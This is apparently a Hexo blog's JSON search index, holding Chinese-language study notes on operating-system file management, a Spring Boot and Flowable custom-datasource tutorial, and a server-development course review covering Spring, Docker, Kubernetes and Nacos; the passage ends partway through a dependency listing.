{"meta":{"title":"铃的杂货铺","subtitle":"二阶铃图","description":"喜欢夏天的无名之辈","author":"可弟WZ铃号机","url":"http://blog.kekwy.com","root":"/"},"pages":[{"title":"404 Not Found","date":"2022-07-30T02:45:25.000Z","updated":"2022-07-30T02:57:34.055Z","comments":true,"path":"404.html","permalink":"http://blog.kekwy.com/404.html","excerpt":"","text":"404"},{"title":"文章合集","date":"2022-07-31T13:04:10.582Z","updated":"2022-07-31T13:04:10.582Z","comments":true,"path":"categories/index.html","permalink":"http://blog.kekwy.com/categories/index.html","excerpt":"","text":""},{"title":"关于","date":"2022-07-31T13:41:20.153Z","updated":"2022-07-31T11:25:31.267Z","comments":false,"path":"about/index.html","permalink":"http://blog.kekwy.com/about/index.html","excerpt":"","text":"喜欢夏天的社畜程序猿，南京大学计算机系本科生，我的世界建筑玩家。 B站: 可弟WZ柒号机 知乎: 可弟岭冬 GitHub: Kekwy 近期计划： 文章：《从继承开始的Java应用笔记》 视频：《我的世界·水星生存指南》 项目：一个3D联机小游戏"},{"title":"大伙儿","date":"2022-07-30T15:17:01.000Z","updated":"2022-07-31T13:04:48.714Z","comments":false,"path":"friends/index.html","permalink":"http://blog.kekwy.com/friends/index.html","excerpt":"","text":""},{"title":"留言板","date":"2022-07-31T13:03:54.437Z","updated":"2022-07-31T13:03:54.437Z","comments":true,"path":"comments/index.html","permalink":"http://blog.kekwy.com/comments/index.html","excerpt":"","text":"也可以是聊天室（"},{"title":"记录生活","date":"2022-07-31T11:26:11.263Z","updated":"2022-07-31T11:26:11.263Z","comments":false,"path":"recordings/index.html","permalink":"http://blog.kekwy.com/recordings/index.html","excerpt":"","text":"2022七月7.31 网站功能初步竣工，将在使用过程中调整或完善。"}],"posts":[{"title":"《操作系统教程 第 5 版》意识流笔记","slug":"os-notes","date":"2023-09-07T07:15:55.000Z","updated":"2023-09-07T09:33:45.700Z","comments":true,"path":"os-notes/","link":"","permalink":"http://blog.kekwy.com/os-notes/","excerpt":"","text":"《操作系统教程 第 5 版》意识流笔记第 6 章 文件管理1. 文件系统文件与管理信息资源的管理程序； （1）操作系统中负责存取和管理信息资源的模块； （2）采用统一方法管理用户信息和系统信息的存储、检索、更新、共享和保护； （3）为用户提供文件使用及操作方法。 2. “文件”用户关注逻辑结构；系统关注物理结构。从逻辑文件和物理文件两个侧面观察文件。 3. 文件系统的主要功能 实现逻辑文件&#x2F;地址&#x2F;结构与物理文件&#x2F;地址&#x2F;结构的互相转换， 使得存取速度快、存储空间利用率高、数据可共享、安全可靠性好。 （1）文件的按名存取； （2）文件目录的建立和维护； （3）文件的查找和定位； （4）文件存储空间的分配和管理； （5）提供文件的存取方法和文件存储结构； （6）实现文件共享、保护和保密； （7）提供易用的文件操作和命令； （8）提供与设备管理交互的统一接口。 6.1 文件6.1.1 文件概念和命名1. 文件由信息按一定的结构方式组成，可持久化保存的抽象机制； （1）由文件名标识，用户通过文件名就可以访问文件； （2）文件名的格式和长度因系统而异。 2. 文件系统的优点（1）便于用户使用：“按名访问”； （2）文件安全可靠：只有通过文件系统才能实现对文件的访问； （3）能有效地利用存储空间； （4）实现文件共享：不同的用户可以通过同名或异名的方式访问同一个文件。 3. 文件命名文件名由文件名和扩展名两部分组成，前者用于识别文件，后者用于区分文件类型，中间用”.”隔开。 6.1.2 文件类型和属性1. 文件类型（1）按用途：系统文件、库文件、用户文件； （2）保护级别：只读文件、读写文件、不保护文件； （3）信息流向：输入文件、输出文件、输入输出文件； （4）数据类型：源程序文件、可执行文件； （5）设备类型：磁盘文件、磁带文件、光盘文件； 除此之外，还可按文件的逻辑结构或物理结构分类； 对设备的访问也都基于文件进行。 2. Linux 支持的文件类型（1）普通文件：包括 ASCII 文件、二进制文件，如源程序文件、数据文件、目标代码文件及操作系统文件，一般存储在磁盘上； （2）目录文件：由文件目录构成的用于维护文件系统结构的系统文件（由字符信息组成），普通文件的查找依赖于目录文件； （3）特殊文件：指各种外部设备文件， 块设备文件：磁盘、光盘上； 字符设备文件：终端、打印机。 3. 文件属性指操作系统为文件配置的控制和管理信息 -&gt; 方便系统和用户对文件的管理、保护和使用。 （1）基本属性； （2）类型属性； （3）保护属性； （4）管理属性； （5）控制属性。 6.1.3 文件存取方法1. 文件存取方法读写文件存储器上的物理记录的方法。 （1）顺序存取； （2）直接存取； （3）索引存取。","categories":[{"name":"考研复习","slug":"考研复习","permalink":"http://blog.kekwy.com/categories/%E8%80%83%E7%A0%94%E5%A4%8D%E4%B9%A0/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://blog.kekwy.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"OS","slug":"OS","permalink":"http://blog.kekwy.com/tags/OS/"},{"name":"考试","slug":"考试","permalink":"http://blog.kekwy.com/tags/%E8%80%83%E8%AF%95/"},{"name":"复习","slug":"复习","permalink":"http://blog.kekwy.com/tags/%E5%A4%8D%E4%B9%A0/"},{"name":"笔记","slug":"笔记","permalink":"http://blog.kekwy.com/tags/%E7%AC%94%E8%AE%B0/"}],"author":"Ke_DiWZ"},{"title":"Spring Boot 集成 Flowable 并自定义数据源","slug":"flowable-datasource","date":"2023-04-26T01:17:33.000Z","updated":"2023-04-26T04:12:42.548Z","comments":true,"path":"flowable-datasource/","link":"","permalink":"http://blog.kekwy.com/flowable-datasource/","excerpt":"","text":"问题描述在使用 flowable-spring-boot-starter 进行 spring boot 集成 flowable 时，flowable 会使用配置文件中 spring.datasource 前缀下设置的数据源： 1234567spring: datasource: type: com.zaxxer.hikari.HikariDataSource driver-class-name: com.mysql.cj.jdbc.Driver url: datasource1 username: xxxx password: xxxx 而项目中的其他数据库工具，如 mybatis 等，同样也会使用此数据源。由于 flowable 相关的表结构过多，该数据源我们只希望保存与项目业务相关的表结构，故尝试使 flowable 使用其他数据源（非默认，自定义）。 Spring Boot 版本：3.0.5 Flowable 版本：7.0.0.M1 相关依赖： 12345678910111213&lt;!-- MySQL --&gt;&lt;dependency&gt; &lt;groupId&gt;com.mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-j&lt;/artifactId&gt; &lt;version&gt;8.0.32&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt;&lt;!-- https://mvnrepository.com/artifact/org.flowable/flowable-spring-boot-starter --&gt;&lt;dependency&gt; &lt;groupId&gt;org.flowable&lt;/groupId&gt; &lt;artifactId&gt;flowable-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;7.0.0.M1&lt;/version&gt;&lt;/dependency&gt; 解决方案首先在配置文件中添加我们自定义的数据源，前缀任意，不冲突即可： 1234567flowable: datasource: type: com.zaxxer.hikari.HikariDataSource driver-class-name: com.mysql.cj.jdbc.Driver url: datasource2 username: xxxx password: xxxx 定义 org.flowable.common.engine.impl.EngineConfigurator 接口的一个实现类，读取配置文件信息并在 beforeInit 方法中创建数据源。使用 @Component 注解生成 bean： 12345678910111213141516171819202122232425262728293031323334353637383940@Componentpublic class DatasourceConfigurator implements EngineConfigurator &#123; @Value(&quot;$&#123;flowable.datasource.url&#125;&quot;) private String url; @Value(&quot;$&#123;flowable.datasource.type&#125;&quot;) private Class&lt;? extends DataSource&gt; type; @Value(&quot;$&#123;flowable.datasource.driver-class-name&#125;&quot;) private String driverClassName; @Value(&quot;$&#123;flowable.datasource.username&#125;&quot;) private String username; @Value(&quot;$&#123;flowable.datasource.password&#125;&quot;) private String password; @Override public void beforeInit(AbstractEngineConfiguration engineConfiguration) &#123; DataSource dataSource = DataSourceBuilder.create() .type(type) .driverClassName(driverClassName) .url(url) .username(username) .password(password).build(); engineConfiguration.setDataSource(dataSource); &#125; @Override public void configure(AbstractEngineConfiguration engineConfiguration) &#123; &#125; @Override public int getPriority() &#123; return 600000; // 保证该优先级最高 &#125;&#125; 定义一个配置类，实现接口 org.flowable.spring.boot.EngineConfigurationConfigurer。将 datasourceConfigurator 注入，在 configure 方法中将其加入 Flowable 引擎的上下文中。 12345678910111213141516@Configurationpublic class ProcessEngineConfig implements EngineConfigurationConfigurer&lt;SpringAppEngineConfiguration&gt; &#123; private DatasourceConfigurator datasourceConfigurator; @Autowired public void setDatasourceConfigurator(DatasourceConfigurator datasourceConfigurator) &#123; this.datasourceConfigurator = datasourceConfigurator; &#125; @Override public void configure(SpringAppEngineConfiguration engineConfiguration) &#123; engineConfiguration.addConfigurator(datasourceConfigurator); &#125; &#125; 观察日志发现我们自定义的配置成功地被 Flowable 引擎调用执行了： 在日志中还可以看到其他五个 Flowable 自动添加的 Configurator 和各自的优先级，优先级高的晚调用，相同配置高优先级会覆盖低优先级。故我们在定义自己的 Configurator 时需要设置一个比上述五个 Configurator 更高的优先级。 实现接口 org.flowable.spring.boot.EngineConfigurationConfigurer 时，注意一定要使用 SpringAppEngineConfiguration 作为泛型参数。 至此，问题成功解决，欢迎大家指正。","categories":[{"name":"问题记录","slug":"问题记录","permalink":"http://blog.kekwy.com/categories/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"Flowable","slug":"Flowable","permalink":"http://blog.kekwy.com/tags/Flowable/"},{"name":"data source","slug":"data-source","permalink":"http://blog.kekwy.com/tags/data-source/"},{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"Spring Boot","slug":"Spring-Boot","permalink":"http://blog.kekwy.com/tags/Spring-Boot/"},{"name":"开发","slug":"开发","permalink":"http://blog.kekwy.com/tags/%E5%BC%80%E5%8F%91/"}],"author":"Ke_DiWZ"},{"title":"服务端开发 课程总结 复习大纲","slug":"se-serverdev","date":"2023-04-09T15:56:56.000Z","updated":"2023-04-09T15:58:28.292Z","comments":true,"path":"se-serverdev/","link":"","permalink":"http://blog.kekwy.com/se-serverdev/","excerpt":"","text":"服务端开发 复习大纲一、建立开发环境 一个简单 Spring Boot 应用程序的开发与运行 开发期工具：Spring Boot DevTools 代码变更后应用会自动重启； 当面向浏览器的资源等发生变化时，会自动刷新浏览器； 自动禁用模板缓存； 如果使用 H2 数据库，则内置了 H2 控制台： http://localhost:8080/h2-console 仅在运行期（runtime）发挥作用。 源代码仓库管理需纳入版本控制的有：功能代码、测试代码、测试脚本、构建脚本、部署脚本、配置文件。 Git 关键概念 add：从工作区提交到暂存区； commit：从暂存区提交到本地仓库。 二、依赖注入 Spring 的两个核心技术：DI（依赖注入）、AOP（面向切面编程）； Spring 是一个容器。 自动化配置组件扫描、自动装配 @Component：告诉 Spring 需要在上下文中实例化一个当前类的对象作为 bean； @Autowired：将实例化后的 bean 装配到当前对象中，使其建立其依赖关系。 构造方法； 属性的 Setter 方法； （私有）属性； Bean 的作用域 可以使用 @Scope 注解改变 bean 的作用域 Singleton：单例；（默认） Prototype：原型，每次注入或者通过 Spring 应用上下文获取的时候，都会创建一个新 bean 实例； Session：会话，在 Web 应用中，为每个会话创建一个 bean 实例； Request：请求，在 Web 应用中，为每个请求创建一个 bean 实例。 三、面向切面编程 软件开发一定要解耦 场景： 将日志逻辑与业务代码分离； 安全认证与业务代码解耦合； 事务处理； 缓存。 重点：解耦合 其他的是想方式： 继承：继承自一个具有相关功能的类，但是导致业务类对日志类形成强依赖； 委托：维护一个日志对象的引用 面向切面：业务代码对切面层代码无感知 Spring 开启切面 在 pojo 上添加 @Aspect 注解； 实例化切面对象； 在主类上添加启用切面的注解 @EnableAspectJAutoProxy； spring 仅支持方法作为连接点：将切面插在调用前或调用后 织入：编译时织入、类加载器织入、运行期织入 横切关注点。 AOP（代理实现）的好处，对开发者： 业务对象和切面完全解耦，可以分别开发； 运行时可以结合在一起，也可以灵活修改是否要切入以及在哪切入； 修改切面不必更改业务层代码。 避免切点表达式重复dry原则：避免重复 避免切点表达式重复，使用 @Pointcut 注解进行提取。 123456@Pointcut(&quot;execution(* concert.Performance.perform( .. ))&quot;)public void performance() &#123;&#125;@Before(&quot;performance()&quot;)public void @Around 但凡上学期写 Java 大作业的时候知道这个好东西… 没有 @Component 的作用！！！该实例不属于 Spring 包 12345678910@Around(&quot;performance()&quot;)public void test(ProceedingJoinPoint joinPoint) &#123; try &#123; doSomething1(); // @Before joinPoint.proceed(); // 调用切点方法 doSomething2(); // @AfterReturning &#125; catch &#123; doSomething3(); // @AfterThrowing &#125;&#125; 兼有 @Component 效果的注解@Controller； @Service； @Repository. AOP 术语在 Spring 中的解释 通知（Advice）：切面做什么以及何时做，在方法上添加 @Before 等注解； 切点（Pointcut）：何处，切点表达式； 切面（Aspect）：Advice 和 Pointcut 的结合， Aspect 类； 连接点（Join point）：方法、字段修改、构造方法； 引入（introduction）：引入新的行为和状态； 织入（Weaving）：切面应用到目标对象的过程。 切点指示器12345678910111213141516@Pointcut(&quot;execution(* soundsystem.CompactDisc.playTrack( int ))&quot; + &quot;&amp;&amp; args(trackNumber)&quot;)public void trackPlayed(int trackNumber) &#123; &#125;/*args 指示器的使用：通过切点指示器 `args(trackNumber)` 将切点方法中的参数 trackNumber 引入当前的切面方法中。*/@Before(&quot;trackPlayed(trackNumber)&quot;)public void countTrack(int trackNumber) &#123; ... // 此时方法中传入的参数 trackNumber，即为切点目标方法被调用时传入的参数&#125; 其他的指示器： execution(* soundsystem.CompactDisc.playTrack( int )) 表示对任何该方法的实现都进行植入，有可以该方法在其他包中有存在实现，该写法也会为其进行植入。 &amp;&amp; within(soundsystem.*) ：限定包路径； &amp;&amp; bean(sgtPeppers)：限定bean名称，或者： &amp;&amp; !bean(sgtPeppers)； @Around(&quot;@annotation(innerAuth)&quot;) ：限定注解。（RuoYi 框架）。 引入接口（introduction） 需要给一个已有的类增加一些新的方法与属性，但是又不改动原有的类。 在 Spring 中可以通过定义切面实现，Spring 会用代理对象的方式进行织入。 123456@Aspectpublic class EncoreableIntroducer &#123; @DeclareParents(value = &quot;concert.Performance+&quot;,//后面的+表示应用到所有实现了该接口的Bean defaultImpl = DefaultEncoreable.class) public static Encoreable encoreable;&#125; 将 DefaultEncoreable 中的行为加入上述指定的 bean 中。 四、Web 开发框架（Web MVC）lombok简化代码的书写，避免反复编写重复的代码； 编译期之后不需要，要排除； 为使其正确被 IDE 识别，需要在 IDE 中安装对应的插件。 session客户端与服务端之前的多次请求。 Spring MVC 的请求映射注解通用的： @RequestMapping;（可以放在类的上面也可以放在方法上面） 具体的： @GetMapping; @PostMapping; @PutMapping; @DeleteMapping; @PatchMapping. 视图控制器 免去定义一个 Controller 类 用于定义简单的返回一个视图的功能。 程序入口SpringBoot 的程序入口类需要添加 @SpringBootApplication 注解。 三层架构 根据 url 找到对应的控制器； 对客户端的参数进行解析（@PathVariable 路径参数、@RequestParam 请求参数、model 表单参数、@RequestBody json 请求体）； 控制器调用业务层方法，获取返回值； 对于前后端不分离的场景，控制器将数据加入 model，返回视图名； 对于前后端分离的场景，将 Java 对象转为 json 对象，@RestController、@ResponseBody。 五、数据持久化 Spring Data JDBC、JPA JdbcTemplate 简化样板式的代码，jdbc 驱动程序、屏蔽底层各数据库的差异 只需要提供查询的逻辑，获得 connection 以及将其关闭等重复性代码由 Spring 代为完成； 需要自定义中间表存放各对象的关联关系。 SpringDataJdbc包路径为 org.springframework.data.annotation.*：Spring 本身提供； 不需要实现接口，在实体类上添加注解 @Table（可选，用于指定表名）。 resource 目录下的 schema.sql 文件会在程序启动时被执行，用于表的创建； data.sql 用于初始化数据，一般用于测试。 id 在插入后由数据库自动生成，下同。 SpringDataJPA只需要定义接口，且父接口的包路径与 SpringDataJdbc 相同； 包路径为：javax.persistence.* 是一个标准的包路径，与具体的厂家没有关系； JPA 是一个规范，不同的厂家可以分别实现； 需要添加 @Entity 的注解（必须），根据注解表达的类间关系自动创建表结构，并且根据包含关系额外创建中间表）； JPA 自定义查询方法 JPA 的宗旨是为 POJO 提供持久化标准规范 可以自定义查询方法，无需实现： 领域特定语言，spring data 的命名约定； 查询动词 + 主题 + 断言； 查询动词：get、read、find、count。 声明自定义查询： 不符合方法命名约定时，或者命名太长时，可以使用 JPQL 语句： 12@Query(&quot;Order o where o.deliveryCity = &#x27;Seattle&#x27;&quot;)List&lt;TacoOrder&gt; readOrdersDeliveredInSeattlt(); spring data jdbc 也可以使用该注解自定义查询逻辑，但是功能十分有限。 为什么要先定义接口？ 我们在实现接口时有很多可选的实现方案，解耦需求； 帮助测试，需要测试业务层代码，基于接口模拟实现，避免启动真实的数据库； CommandLineRunner bean 可用于对数据进行初始化 ApplicationRunner 接口，获得参数的方式不同 【问答】三者的关系 第一个需要我们实现接口，后两个不需要我们实现接口。 JPA 是一个规范，Hibernate 是一个实现了该规范的厂家，spring data jpa 提供了支持 JPA 规范的框架，支持引入各厂家对 JPA 的具体实现。 六、Spring Security用户信息的存储 内存用户存储； JDBC 用户存储； LDAP 用户存储。 Spring Security 的工作方式 userdetail、userdetailService 实现用户信息的存储； 实现 UserdetailService 接口，根据参数用户名从 Dao 层获取用户对象； 实现 PasswordEncoder 接口并在 Spring 上下文中实例化； 用户认证与授权由 Spring Security 自动完成； HttpSecurity 中设置访问各路径需要的权限； 提供参数 username、password（也可以自行配置）； .loginPage(url)：配置登录时需要跳转到的路径。 服务端依据 sessionID 判断当前请求是否来自一个认证过的用户 指定login url，框架会自动对发送到该 url 的 post 请求进行处理 指定 logout url，post 到该 url 可以使当前客户端 cookie 失效（发送一个新的未绑定用户的 cookie） 七、Docker 使用docker run 命令 -d: 后台运行容器，并返回容器ID -i: 以交互模式运行容器，通常与 -t 同时使用 -t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用 -p: 指定（发布）端口映射，格式为：主机(宿主)端口:容器端口 -P: 随机端口映射，容器内部端口随机映射到主机的高端口 –name&#x3D;”nginx-lb”: 为容器指定一个名称 -e username&#x3D;”ritchie”: 设置环境变量 –env-file&#x3D;c:&#x2F;temp1&#x2F;t1.txt: 从指定文件读入环境变量 –expose&#x3D;2000-2002: 开放（暴露）一个端口或一组端口； –link my-mysql:taozs : 添加链接到另一个容器 -v c:&#x2F;temp1:&#x2F;data: 绑定一个卷(volume) –rm 退出时自动删除容器 cat &#x2F;etc&#x2F;hosts 查看当前容器的 IP 地址。 常用管理命令 volume：数据卷； network：网络； container：容器； image：镜像。 docker stop：停止容器，可以被重启。 容器与虚拟机的区别： 虚拟机：完全独立； 容器：共享一个操作系统内核。 对使用者来说容器与虚拟机完全相同 dockerdocker 是一个软件用于管理容器，而不是容器本身。 组成部分：client、daemon（engine）、index（指向 docker 仓库）。 docker 利用 Hyper-V 技术在 Windows 操作系统中生成一台 Linux 虚拟机，然后在其中运行 docker engine。 spring 的容器是 bean、tomcat 的容器是 servlet 容器的作用：获得一个纯净的运行环境。 生产流程：基于容器技术可以实现持续集成持续交付的流水线； 软件架构：将大的系统细分为一个个微服务，微服务的架构模式与容器技术相伴而生。 docker -&gt; kubernetes-&gt;istio -it 进入交互模式 –rm 退出交互自动删除 数据卷 volume 容器挂掉也可以保存 myvolume:&#x2F;data 冒号的左边为数据卷空间，右边为想要映射到的虚拟机中的目录 容器网络 容器之间的互联互通 docker network ls： bridge 网络（类比交换机） 镜像就相当于 class，容器就相当于对象。  none网络，–net&#x3D;none host网络，–net&#x3D;host 【共享宿主机网络】 bridge网络，–net&#x3D;bridge ， docker0 的 linux bridge 【NAT 网关】 container模式，–net&#x3D;container:NAME_or_ID 八、镜像的构建与编排制作镜像的核心文件：Dockerfile Dockerfile 的命令 FROM：指定基础镜像，必须为第一个命令 RUN：构建镜像时执行的命令 ADD：将本地文件添加到容器中，tar类型文件会自动解压 COPY：功能类似ADD，但是不会自动解压文件 CMD：构建容器后调用，也就是在容器启动时才进行调用 ENTRYPOINT：配置容器，使其可执行化。配合CMD可省去“application”，只使用参数，用于docker run时根据不同参数执行不同功能 LABEL：用于为镜像添加元数据 ENV：设置环境变量 相当于 -e EXPOSE：指定与外界交互的端口，容器内的端口号，docker run时加-P则会映射一个随机号（宿主机） VOLUME：用于指定持久化目录，docker run时如果没有指定挂载目录，会创建一个volume WORKDIR：工作目录，类似于cd命令 USER：指定运行容器时的用户名或 UID ARG：用于指定传递给构建运行时的变量 ONBUILD：用于设置镜像触发器 copy 命令会忽略 .dockerignore 中的文件或目录 编写最佳的 Dockerfile 使用 .dockerignore文件； 容器只运行单个应用； 将多个 RUN 指令合并为一个，减少镜像的分层； 基础镜像的标签不要用 latest； 每个 RUN 指令后删除多余文件； 选择合适的基础镜像(alpine版本最好)； 设置 WORKDIR 和 CMD. 镜像分层将多个 RUN 合成一个，尽可能避免过多的创建镜像层级 合理调整 dockerfile 命令的顺序，加快镜像构建速度。将经常变化的指令放在后面。 Alpine 轻量级（jdk -&gt; jre） 与容器交互docker -exec Docker Compose 依赖 yaml 文件 服务：一个应用的容器（可能会有多个容器），实际上可以包括若干运行相同镜像的容器实例； 项目：由一组关联的应用容器组成的一个完整业务单元，在 docker-compose.yml 文件中定义。 YAML 使用缩进表示层级关系，不允许使用Tab键，只允许使用空格 #表示注释，从这个字符一直到行尾，都会被解析器忽略。 对象，键值对，使用冒号结构表示 animal: pets hash: { name: Steve, foo: bar } 数组,一组连词线开头的行，构成一个数组： - Cat - Dog - Goldfish 行内表示法：animal: [Cat, Dog] docker-compose 常用命令 docker-compose –help； docker-compose up -d # 该命令十分强大，它将尝试自动完成包括构建镜像，（重新）创建服务，启动服务，并关联服务相关容器的一系列操作； * docker-compose ps、docker-compose ps –services：仅呈现当前所部署的项目下的容器，而不是呈现所有的； * docker-compose images； docker-compose stop # 终止整个服务集合； docker-compose stop nginx # 终止指定的服务 （这有个点就是启动的时候会先启动 depond_on 中的容器，关闭的时候不会影响到 depond_on 中的）； * docker-compose logs -f [services…] # 查看容器的输出日志； docker-compose build [SERVICE…]； docker-compose rm nginx # 移除指定的容器； docker-compose up -d –scale flask&#x3D;3 organizationservice&#x3D;2 #设置指定服务运行的容器个数。 九、k8s 使用 kubectl 是 k8s 的一个客户端程序 k8s 的资源ingress、deployment、service、pod. Pod Pod是Kubernetes调度的最小单元 一个Pod可以包含一个或多个容器，因此它可以被看作是内部容器的逻辑宿主机。Pod的设计理念是为了支持多个容器在一个Pod中共享网络和文件系统： PID命名空间：Pod中不同的应用程序可以看到其他应用程序的进程ID； network命名空间：Pod中多个容器处于同一个网络命名空间，因此能够访问的IP和端口范围都是相同的。也可以通过localhost相互访问； IPC命名空间：Pod中的多个容器共享Inner-process Communication命名空间，因此可以通过SystemV IPC或POSIX进行进程间通信； UTS命名空间：Pod中的多个容器共享同一个主机名； Volumes：Pod中各个容器可以共享在Pod中定义分存储卷（Volume）。 快速映射（调试用） 本地 : pod&#x2F;service 123kubectl port-forward pod/myspittr 8081:8080# http://localhost:8081/spittr/kubectl port-forward service/demo 8081:80 其他两种访问内部服务的方式 创建 ingress； 1kubectl create ingress myspittr --class=nginx --rule=www.demo.com/*=myspittr:8080 使用 curl 工具。 为什么需要“打标签”：可以为服务指定对应的pod； 服务的集群 IP 是相对不变的。 进行动态的升级和扩容 更新镜像重部署： kubectl set image deployment&#x2F;spittr spittr&#x3D;spittr:1.0 扩容： kubectl scale deployment spittr –replicas 2 自动伸缩： kubectl autoscale deployment spittr –min&#x3D;10 –max&#x3D;15 –cpu-percent&#x3D;80 请求量大可以多部署一些实例 查看历史版本： kubectl rollout history deployment&#x2F;spittr 回滚到前一个版本： kubectl rollout undo deployment&#x2F;spittr docker 只能部署在一个设备上，而 k8s 可以对集群环境进行管理，k8s 可以调度自动决定将镜像搭载在哪一个虚机上。 我们的课程中，k8s 依赖的虚机是由 docker 创建出来的 k8s 的使用以 docker 为基础，每一个加入集群的 node 都需要安装 docker 软件。 对外可供访问的资源是 “服务”，不要直接访问具体的 pod，因为 pod 的分配是由 k8s 动态管理的。 服务可能由多个 pod 组成，但是使用者只需知道服务名，而不必关心提供服务的 pod 有哪些。 十、REST 服务、微服务开发与部署单体应用程序的缺陷 数据库的表对所有模块可见； 一个人的修改整个应用都要重新构建、测试、部署； 整体复制分布式部署，不能拆分按需部署。 微服务架构模式的特征* 应用程序分解为具有明确定义了职责范围的细粒度组件； 完全独立部署，独立测试，并可复用； 使用轻量级通信协议，HTTP 和 json，松耦合； 服务实现可使用多种编程语言和技术； 将大型团队划分为多个小型团队，每个团队只负责开发维护他们各自的服务。 Spring Boot 和 Spring Cloud Spring Boot 提供了基于 Java 的、面向 REST 的微服务框架； Spring Cloud 使实施和部署微服务到私有云或公有云变得更加简单。 HTTP 状态码* 状态码：由 3 位数字组成，第一位标识响应的类型，常用的5大类状态码如下： 1xx：表示服务器已接收了客户端的请求，客户端可以继续发送请求 2xx：表示服务器已成功接收到请求并进行处理 3xx：表示服务器要求客户端重定向 4xx：表示客户端的请求有非法内容 5xx：标识服务器未能正常处理客户端的请求而出现意外错误 Controller 的两个作用 标识：告诉开发者这个类是一个控制器实现； component 的作用：告诉 Spring 需要实例化一个该类的对象 bean。 @ExceptionHandler自定义异常处理方法。 如果服务端不定义自定义处理方法，则仅会向客户端返回 500 状态码，而客户端不知道服务端出现了什么问题，这是对客户端不友好的。 @ResponseStatus可以在这个注解中统一指定响应码。 Rest 原则 Representational State Transfer，表现层状态转移 资源（Resources），就是网络上的一个实体，标识：URI 表现层（Representation）：json、xml、html、pdf、excel 状态转移（State Transfer）：服务端–客户端 HTTP协议的四个操作方式的动词：GET、POST、PUT、DELETE✓ CRUD：Create、Read、Update、Delete 如果一个架构符合REST原则，就称它为RESTful架构。 Spring Boot 简化Spring Web开发 Spring Boot Starter✓ 自动管理依赖、版本号 自动配置✓ 根据类路径加载的类自动创建需要的Bean✓ 如：DataSource、JdbcTemplate、视图解析器等 Actuator：获得很多的端点*✓ &#x2F;autoconfig 使用了哪些自动配置（positiveMatches）✓ &#x2F;beans，包含bean依赖关系 微服务开发要考虑的问题 微服务划分，服务粒度、通信协议、接口设计、配置管理、使用事件解耦微服务 服务注册、发现和路由 弹性，负载均衡，断路器模式（熔断），容错 可伸缩（动态增加和缩小自己的实例数） 日志记录和跟踪 安全 构建和部署，基础设施即代码 微服务划分 可以从数据模型入手，每个域的服务只能访问自己的表 刚开始粒度可以大一点，不要太细，由粗粒度重构到细粒度是比较容易的 设计是逐步演化的 接口的设计 使用标准HTTP动词：GET、PUT、POST、DELETE，映射到CRUD 使用URI来传达意图 请求和响应使用JSON 使用HTTP状态码来传达结果 运维实践* 都在源代码库中； 指定JAR依赖的版本号； 配置与源代码分开放； 已构建的服务是不可变的，不能再被修改； 微服务应该是无状态的，将状态外置，因为 pod 可变化； 并发，通过启动更多的微服务实例横向扩展，多线程是纵向扩展。 十一、基于 NACOS 的数据配置将服务配置信息与代码分开：属性不能和源代码放在一起： 属性比较敏感，不希望开发人员可见； 属性是需要变化的，如测试中使用的数据与生产中使用的数据库不同。 集中提供配置的方式：  配置信息硬编码到代码中 分离的外部属性文件 与物理部署分离，如外部数据库 k8s-configmap（为 k8s 中的一种资源） 配置数据作为单独的服务提供 使用 nacos 进行配置管理的步骤* nacos 也是一个软件 更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。 加依赖： 1234&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;&lt;/dependency&gt; 在 bootstrap.yml 中定义 nacos 的访问地址，以及文件的后缀和服务名，用于组合 dataId。 使用 @Value(属性名) 获取属性值，使用 @RefreshScope 实现自动刷新。 dataId 的完整格式 ${prefix}-${spring.profiles.active}.${file-extension} prefix 默认为 spring.application.name 的值，也可以通过配置项 spring.cloud.nacos.config.prefix来配置 spring.profiles.active 即为当前环境对应的 profile file-exetension 为配置内容的数据格式，可以通过配置项 spring.cloud.nacos.config.file-extension 来配置。 目前只支持 properties 和 yaml 类型 curl工具介绍k8s部署：kubectl run -i -t –rm&#x3D;true mycurl –image&#x3D;curlimages&#x2F;curl:latest –restart&#x3D;Never –command – sh -i -t：交互 –rm：退出时删除； –restart&#x3D;Never：不自动重启； –command[0x20]–[0x20]x：在容器启动后直接执行命令 x。 在 k8s 内部：* 可以通过服务名加端口访问对应的服务； 可以通过服务的集群 IP 进行访问； 可以通过 pod 的 IP 地址进行访问； 但是 不可以 通过 pod 名访问。 在 spring cloud 中使用 nacos： spring.application.name&#x3D;example，微服务开发的服务名 默认使用服务名作为前缀； spring.cloud.nacos.config.file-extension&#x3D;yaml &#x2F;&#x2F; 将后缀指定为 yaml spring 框架提供的注解 使用 @Value 注解进行属性值的注入 @RefreshScope 自动刷新 使用 nc 测试端口是否可用 敏感信息的存储对称加密：一个密钥 ； 非对称加密：公钥和私钥。 加入 rsa 依赖； 在微服务容器中添加环境变量： 加密的口令 十二、基于 NACOS 的服务注册与发现nacos 等待一段时间收不到心跳之后（默认 5s）会删除不可用的服务。 服务发现的好处* 快速水平伸缩，而不是垂直伸缩。不影响客户端 水平伸缩：任意增加或减少服务实例数，而客户端无感知，但可随时获取可用信息； 垂直伸缩：增加主机性能，而不是增加新的实例； 不影响客户端：客户端不用关心对方的 IP 地址端口号，只需要知道服务名。 提高应用程序的弹性： 系统的可靠性、系统的容错性。 服务注册与发现的弹性体现在： 如果五个服务中有个实例挂了，nacos 就不会再提供这个不可用实例的信息给客户端。 Spring Cloud Alibaba 子项目Nacos、Sentinel 负载均衡客户端对服务进行选择，openfeign loadbalancer，客户端的负载均衡。 借助 nacos 做服务注册与发现 加入 starter 依赖： 1234567891011121314151617181920&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; 